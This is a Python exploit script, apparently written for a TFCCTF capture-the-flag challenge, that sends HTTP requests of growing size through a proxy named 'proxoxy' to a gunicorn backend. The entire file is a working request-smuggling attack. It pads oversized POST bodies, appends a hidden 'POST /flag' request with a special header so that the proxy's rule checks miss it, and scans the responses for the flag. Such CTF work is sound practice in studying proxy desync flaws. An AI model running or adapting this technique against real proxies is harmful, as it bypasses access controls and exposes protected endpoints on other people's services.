#!/usr/bin/env python3
"""
'burrito fill it with beans': does proxoxy fall back to an unchecked passthrough
once a request body exceeds its bounded-buffer reservation?

req1 has a large Content-Length; the smuggled POST /flag is appended AFTER the
declared body, so gunicorn drains CL bytes and then parses it as request 2.
If proxoxy still frames correctly it will rule-check and drop request 2.
"""
import socket
import sys
import time

H = "127.0.0.1"
REALP, REALD = 28888, 28900

SMUG = (b"POST /flag HTTP/1.1\r\n"
        b"Host: h\r\n"
        b"brevski: george\r\n"
        b"Content-Length: 0\r\n"
        b"\r\n")
WAKE = b"GET /health HTTP/1.1\r\nHost: h\r\n\r\n"
BLK = b"B" * 65536


def run(port, size, read_for=8.0, wake=True):
    head = (b"POST /health HTTP/1.1\r\nHost: h\r\n"
            b"Content-Length: %d\r\n\r\n" % size)
    s = socket.create_connection((H, port), timeout=15)
    s.settimeout(20)
    out = b""
    try:
        s.sendall(head)
        sent = 0
        while sent < size:
            n = min(len(BLK), size - sent)
            s.sendall(BLK[:n])
            sent += n
        s.sendall(SMUG)
        if wake:
            time.sleep(0.4)
            s.sendall(WAKE)
    except OSError as e:
        return f"SENDFAIL {e!r}", out
    s.settimeout(read_for)
    try:
        while True:
            d = s.recv(65536)
            if not d:
                break
            out += d
    except OSError:
        pass
    s.close()
    return "ok", out


if __name__ == "__main__":
    MB = 1024 * 1024
    sizes = [int(x * MB) for x in (1, 4, 8, 12, 16, 17, 20, 24, 32, 48, 64)]
    if len(sys.argv) > 1:
        sizes = [int(float(a) * MB) for a in sys.argv[1:]]
    for size in sizes:
        st, out = run(REALP, size)
        n = out.count(b"HTTP/1.1 ")
        flag = b"TFCCTF{" in out
        print(f"size={size//MB:3d}MB via-proxoxy {st} resp={n} flag={flag} "
              f"first={out[:24]!r}")
        if flag:
            print("*** FLAG ***", out[out.find(b"TFCCTF{"):][:90])
            break
        sys.stdout.flush()
